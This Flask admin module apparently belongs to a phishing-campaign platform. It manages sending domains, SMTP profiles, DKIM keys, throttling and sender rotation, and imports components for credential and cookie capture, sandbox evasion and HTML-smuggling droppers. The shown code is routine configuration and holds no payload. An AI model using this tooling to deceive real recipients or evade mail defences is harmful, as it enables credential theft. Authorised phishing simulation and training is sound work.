import json
import logging
import base64
import csv
import io
import secrets
import hashlib
from io import BytesIO
from datetime import datetime, timedelta
from urllib.parse import urlparse

from flask import (
    Blueprint, request, redirect, url_for, render_template, session,
    send_file, jsonify, abort, flash, g, make_response, current_app
)
from dropoutjeep_lib import db
from dropoutjeep_lib.models import (
    Subsidiary, SendingProfile, Campaign, Recipient, Event, Target,
    CampaignJob, RateProfile, AutoReplyRule, PendingReply, User, AuditLog,
    TrainingCompletion, ApiToken, EmailTemplate, CampaignVersion, CanaryToken,
    Webhook, ProxyDomain, DomainReputation, SenderRotationPool,
    SenderRotationEntry, RecipientFingerprint, Redirector,
    CapturedCredential, CapturedCookie
)
from dropoutjeep_lib.utils.auth import (
    login_required, admin_required, operator_required, viewer_required,
    log_audit, get_current_user
)
from dropoutjeep_lib.utils.analytics import get_heatmap_data, get_recipient_timeline, export_campaign_csv, export_campaign_pdf
from dropoutjeep_lib.utils.canary import (
    get_canary_embeds, record_canary_trigger, build_canary_url
)
from dropoutjeep_lib.utils.dkim_utils import (
    generate_dkim_keypair, format_dkim_dns_record, dkim_spf_check, check_dmarc
)
from dropoutjeep_lib.utils.validator import (
    validate_campaign_before_launch, validate_smtp_relay, verify_token_sig,
    check_spf, check_dkim_selector, check_spoof_alignment
)
from dropoutjeep_lib.utils.sandbox_evasion import should_serve_real_page, is_sandbox_ua
from dropoutjeep_lib.utils.html_smuggler import build_html_dropper, encode_payload
from dropoutjeep_lib.utils.domain_reputation import get_or_refresh_domain_reputation
from dropoutjeep_lib.utils.risk import recipient_risk_score, campaign_risk_summary
from dropoutjeep_lib.utils.funnel import compute_funnel
from dropoutjeep_lib.utils.scheduler import sync_campaign_schedules
from dropoutjeep_lib.utils.dialer import Dialer
from dropoutjeep_lib.utils.live import push_event

sending_admin_bp = Blueprint('sending_admin', __name__, url_prefix='/admin')

@sending_admin_bp.route('/subsidiary/new', methods=['GET', 'POST'])
@operator_required
def admin_subsidiary_new():
    next_url = request.args.get('next') or request.form.get('next') or url_for('admin_index')
    if request.method == 'POST':
        s = Subsidiary(
            name=request.form['name'],
            sending_domain=request.form['sending_domain'],
            display_name=request.form['display_name'],
            from_address=request.form['from_address'],
            bounce_subdomain=request.form.get('bounce_subdomain'),
            dkim_selector=request.form.get('dkim_selector')
        )
        s.set_dkim_private_key(request.form.get('dkim_private_key'))
        db.session.add(s)
        db.session.commit()
        flash('Subsidiary created successfully!', 'success')
        return redirect(next_url)
    return render_template('sending_profile_new.html', next_url=next_url)


@sending_admin_bp.route('/subsidiaries', methods=['GET'])
@viewer_required
def admin_subsidiaries():
    """List every subsidiary, since the app previously only offered a create form.

    Without this page a wrong From address or selector could only be fixed by
    creating a second subsidiary and repointing the profile.
    """
    subs = Subsidiary.query.order_by(Subsidiary.sending_domain, Subsidiary.name).all()
    profile_counts = {s.id: SendingProfile.query.filter_by(subsidiary_id=s.id).count() for s in subs}
    key_state = {}
    for s in subs:
        try:
            key_state[s.id] = 'stored' if s.get_dkim_private_key() else 'missing'
        except Exception:
            key_state[s.id] = 'unreadable'
    return render_template('subsidiaries.html', subs=subs,
                           profile_counts=profile_counts, key_state=key_state)


@sending_admin_bp.route('/subsidiary/<int:sid>/edit', methods=['GET', 'POST'])
@operator_required
def admin_subsidiary_edit(sid):
    s = Subsidiary.query.get_or_404(sid)
    if request.method == 'POST':
        s.name = request.form['name'].strip()
        s.sending_domain = request.form['sending_domain'].strip().lower()
        s.display_name = request.form['display_name'].strip()
        s.from_address = request.form['from_address'].strip()
        s.bounce_subdomain = (request.form.get('bounce_subdomain') or '').strip() or None
        s.dkim_selector = (request.form.get('dkim_selector') or '').strip().lower() or None
        new_key = (request.form.get('dkim_private_key') or '').strip()
        if new_key:
            s.set_dkim_private_key(new_key)
        db.session.commit()
        log_audit('subsidiary_update',
                  details=f'subsidiary={s.id} domain={s.sending_domain} selector={s.dkim_selector}')
        flash(f'Subsidiary "{s.name}" updated.', 'success')
        return redirect(url_for('sending_admin.admin_subsidiaries'))

    try:
        has_key = bool(s.get_dkim_private_key())
        key_error = None
    except Exception as exc:
        has_key = False
        key_error = str(exc)
    return render_template('subsidiary_edit.html', sub=s, has_key=has_key, key_error=key_error)


@sending_admin_bp.route('/subsidiary/<int:sid>/delete', methods=['POST'])
@operator_required
def admin_subsidiary_delete(sid):
    s = Subsidiary.query.get_or_404(sid)
    in_use = SendingProfile.query.filter_by(subsidiary_id=s.id).count()
    if in_use:
        flash(f'Cannot delete "{s.name}": {in_use} sending profile(s) still point at it. '
              'Repoint or delete those first.', 'danger')
        return redirect(url_for('sending_admin.admin_subsidiaries'))
    name = s.name
    db.session.delete(s)
    db.session.commit()
    log_audit('subsidiary_delete', details=f'subsidiary={sid} name={name}')
    flash(f'Subsidiary "{name}" deleted.', 'success')
    return redirect(url_for('sending_admin.admin_subsidiaries'))


@sending_admin_bp.route('/sending_profile/new', methods=['GET', 'POST'])
@operator_required
def admin_sending_profile_new():
    next_url = request.args.get('next') or request.form.get('next') or url_for('admin_index')
    if request.method == 'POST':
        rate_profile_id = request.form.get('rate_profile_id')
        sp = SendingProfile(
            name=request.form['name'],
            smtp_host=request.form['smtp_host'],
            smtp_port=int(request.form.get('smtp_port') or 25),
            smtp_user=request.form.get('smtp_user'),
            use_tls=request.form.get('use_tls') == 'on',
            subsidiary_id=int(request.form['subsidiary_id']) if request.form.get('subsidiary_id') else None,
            rate_profile_id=int(rate_profile_id) if rate_profile_id else None,
            imap_host=request.form.get('imap_host', '').strip() or None,
            imap_port=int(request.form.get('imap_port') or 993),
            imap_user=request.form.get('imap_user', '').strip() or None,
            imap_use_tls=request.form.get('imap_use_tls') == 'on',
            bimi_logo_url=request.form.get('bimi_logo_url', '').strip() or None,
            arc_enabled=request.form.get('arc_enabled') == 'on',
            arc_selector=request.form.get('arc_selector', '').strip() or None,
            warmup_active=request.form.get('warmup_active') == 'on',
            warmup_day=int(request.form.get('warmup_day') or 0),
        )
        sp.set_smtp_pass(request.form.get('smtp_pass'))
        sp.set_imap_pass(request.form.get('imap_pass'))
        db.session.add(sp)
        db.session.commit()
        flash('Sending profile created successfully!', 'success')
        return redirect(next_url)
    subs = Subsidiary.query.all()
    profiles = RateProfile.query.order_by(RateProfile.is_default.desc(), RateProfile.name).all()
    return render_template('sending_profile_new.html', subsidiaries=subs, rate_profiles=profiles, next_url=next_url)


@sending_admin_bp.route('/sending_profile/<int:profile_id>/edit', methods=['GET', 'POST'])
@operator_required
def admin_sending_profile_edit(profile_id):
    profile = SendingProfile.query.get_or_404(profile_id)

    if request.method == 'POST':
        profile.name = request.form['name']
        profile.smtp_host = request.form['smtp_host']
        profile.smtp_port = int(request.form.get('smtp_port') or 25)
        profile.smtp_user = request.form.get('smtp_user')
        new_pass = request.form.get('smtp_pass')
        if new_pass:
            profile.set_smtp_pass(new_pass)
        profile.use_tls = request.form.get('use_tls') == 'on'

        profile.imap_host = request.form.get('imap_host', '').strip() or None
        profile.imap_port = int(request.form.get('imap_port') or 993)
        profile.imap_user = request.form.get('imap_user', '').strip() or None
        new_imap_pass = request.form.get('imap_pass')
        if new_imap_pass:
            profile.set_imap_pass(new_imap_pass)
        profile.imap_use_tls = request.form.get('imap_use_tls') == 'on'

        profile.bimi_logo_url = request.form.get('bimi_logo_url', '').strip() or None
        profile.arc_enabled = request.form.get('arc_enabled') == 'on'
        profile.arc_selector = request.form.get('arc_selector', '').strip() or None
        profile.warmup_active = request.form.get('warmup_active') == 'on'
        profile.warmup_day = int(request.form.get('warmup_day') or 0)

        subsidiary_id = request.form.get('subsidiary_id')
        profile.subsidiary_id = int(subsidiary_id) if subsidiary_id else None

        rate_profile_id = request.form.get('rate_profile_id')
        profile.rate_profile_id = int(rate_profile_id) if rate_profile_id else None

        db.session.commit()
        flash('Mailer updated successfully!', 'success')
        return redirect(url_for('mailers_page'))

    subsidiaries = Subsidiary.query.all()
    rate_profiles = RateProfile.query.order_by(RateProfile.is_default.desc(), RateProfile.name).all()
    return render_template('sending_profile_edit.html',
                           profile=profile, subsidiaries=subsidiaries,
                           rate_profiles=rate_profiles)


@sending_admin_bp.route('/sending_profile/<int:profile_id>/delete', methods=['POST'])
@operator_required
def admin_sending_profile_delete(profile_id):
    profile = SendingProfile.query.get_or_404(profile_id)
    profile_name = profile.name
    db.session.delete(profile)
    db.session.commit()

    flash(f'Mailer "{profile_name}" deleted successfully!', 'success')
    return redirect(url_for('mailers_page'))


@sending_admin_bp.route('/rate-profiles', methods=['GET', 'POST'])
@operator_required
def admin_rate_profiles():
    """List and create rate throttling profiles."""
    if request.method == 'POST':
        rp = RateProfile(
            name=request.form['name'],
            host_pattern=request.form.get('host_pattern', '').strip() or None,
            hourly_limit=int(request.form.get('hourly_limit') or 500),
            daily_limit=int(request.form.get('daily_limit') or 2000),
            monthly_limit=int(request.form.get('monthly_limit') or 60000),
            delay_ms_min=int(request.form.get('delay_ms_min') or 100),
            delay_ms_max=int(request.form.get('delay_ms_max') or 300),
            burst_size=int(request.form.get('burst_size') or 5),
            is_default=request.form.get('is_default') == 'on',
        )
        db.session.add(rp)
        db.session.commit()
        flash(f'Rate profile "{rp.name}" created.', 'success')
        return redirect(url_for('sending_admin.admin_rate_profiles'))
    profiles = RateProfile.query.order_by(RateProfile.is_default.desc(), RateProfile.name).all()
    return render_template('rate_profiles.html', profiles=profiles)


@sending_admin_bp.route('/dkim/generate', methods=['GET', 'POST'])
@operator_required
def admin_dkim_generate():
    if request.method == 'POST':
        selector = (request.form.get('selector') or '').strip().lower()
        domain = (request.form.get('domain') or '').strip().lower()
        if not selector or not domain:
            flash('Selector and sending domain are both required.', 'danger')
            return redirect(url_for('admin_dkim_generate'))
        priv, dns_txt = generate_dkim_keypair(domain, selector)
        dns_record = format_dkim_dns_record(domain, selector, dns_txt)

        # Persist the private half onto the matching subsidiary. Without this the
        # key exists only in the browser tab, the campaign send path finds no
        # subsidiary.dkim_private_key, and every message goes out unsigned while
        # DMARC quietly fails.
        sub = Subsidiary.query.filter_by(sending_domain=domain).first()
        stored_for = None
        if sub:
            sub.dkim_selector = selector
            sub.set_dkim_private_key(priv)
            db.session.commit()
            stored_for = sub.from_address or sub.display_name or domain
        current_app.logger.info('DKIM keypair generated for %s selector=%s stored=%s',
                                domain, selector, bool(sub))

        return render_template('dkim_result.html', selector=selector,
                               domain=domain, record=dns_record,
                               stored_for=stored_for)
    return render_template('dkim_generate.html')


@sending_admin_bp.route('/sending_profile/validate/<int:sp_id>')
@viewer_required
def admin_validate_profile(sp_id):
    sp = SendingProfile.query.get_or_404(sp_id)
    sub = sp.subsidiary
    results = {'dkim': None, 'spf': None}
    try:
        import dns.resolver
        if sub and sub.dkim_selector:
            name = f"{sub.dkim_selector}._domainkey.{sub.sending_domain}"
            try:
                ans = dns.resolver.resolve(name, 'TXT')
                texts = []
                for r in ans:
                    for s in r.strings:
                        texts.append(s.decode() if isinstance(s, bytes) else str(s))
                joined = ' '.join(texts)
                results['dkim'] = 'p=' in joined.lower()
            except Exception:
                results['dkim'] = False
        else:
            results['dkim'] = False
        try:
            ans2 = dns.resolver.resolve(sub.sending_domain, 'TXT')
            txts = []
            for r in ans2:
                for s in r.strings:
                    txts.append(s.decode() if isinstance(s, bytes) else str(s))
            results['spf'] = any('v=spf1' in t.lower() for t in txts)
        except Exception:
            results['spf'] = False
    except Exception:
        results['dkim'] = None
        results['spf'] = None
    return jsonify(results)


@sending_admin_bp.route('/domain-reputation')
@viewer_required
def admin_domain_reputation():
    reps = DomainReputation.query.order_by(DomainReputation.domain).all()
    return render_template('domain_reputation.html', reps=reps)


@sending_admin_bp.route('/domain-reputation/refresh/<domain>')
@operator_required
def admin_domain_reputation_refresh(domain):
    from dropoutjeep_lib.routes.urlcheck import extract_domain
    clean = extract_domain(domain)
    sub = Subsidiary.query.filter_by(sending_domain=clean).first()
    get_or_refresh_domain_reputation(clean, sub.id if sub else None)
    flash(f'Refreshed reputation for {clean}', 'success')
    return redirect(url_for('admin_domain_reputation'))


@sending_admin_bp.route('/sender-rotation-pools')
@admin_required
def admin_sender_rotation_pools():
    pools = SenderRotationPool.query.order_by(SenderRotationPool.name).all()
    profiles = SendingProfile.query.order_by(SendingProfile.name).all()
    subsidiaries = Subsidiary.query.order_by(Subsidiary.name).all()
    return render_template(
        'sender_rotation_pools.html',
        pools=pools,
        profiles=profiles,
        subsidiaries=subsidiaries,
    )


@sending_admin_bp.route('/sender-rotation-pools/new', methods=['POST'])
@admin_required
def admin_sender_rotation_pool_new():
    name = request.form.get('name', '').strip()
    if not name:
        flash('Pool name is required', 'danger')
        return redirect(url_for('admin_sender_rotation_pools'))
    pool = SenderRotationPool(name=name)
    db.session.add(pool)
    db.session.commit()
    flash(f'Pool "{name}" created', 'success')
    return redirect(url_for('admin_sender_rotation_pools'))


@sending_admin_bp.route('/sender-rotation-pools/<int:pool_id>/delete', methods=['POST'])
@admin_required
def admin_sender_rotation_pool_delete(pool_id):
    pool = SenderRotationPool.query.get_or_404(pool_id)
    # Detach from campaigns first
    Campaign.query.filter_by(sender_rotation_pool_id=pool_id).update({'sender_rotation_pool_id': None})
    db.session.delete(pool)
    db.session.commit()
    flash('Pool deleted', 'success')
    return redirect(url_for('admin_sender_rotation_pools'))


@sending_admin_bp.route('/sender-rotation-pools/<int:pool_id>/entries/new', methods=['POST'])
@admin_required
def admin_sender_rotation_entry_new(pool_id):
    pool = SenderRotationPool.query.get_or_404(pool_id)
    sp_id = int(request.form.get('sending_profile_id') or 0)
    sub_id = request.form.get('subsidiary_id')
    entry = SenderRotationEntry(
        pool_id=pool.id,
        sending_profile_id=sp_id,
        subsidiary_id=int(sub_id) if sub_id else None,
        display_name_override=request.form.get('display_name_override', '').strip() or None,
        from_address_override=request.form.get('from_address_override', '').strip() or None,
        sort_order=int(request.form.get('sort_order') or 0),
    )
    db.session.add(entry)
    db.session.commit()
    flash('Entry added to pool', 'success')
    return redirect(url_for('admin_sender_rotation_pools'))


@sending_admin_bp.route('/sender-rotation-pools/entries/<int:entry_id>/delete', methods=['POST'])
@admin_required
def admin_sender_rotation_entry_delete(entry_id):
    entry = SenderRotationEntry.query.get_or_404(entry_id)
    db.session.delete(entry)
    db.session.commit()
    flash('Entry removed from pool', 'success')
    return redirect(url_for('admin_sender_rotation_pools'))
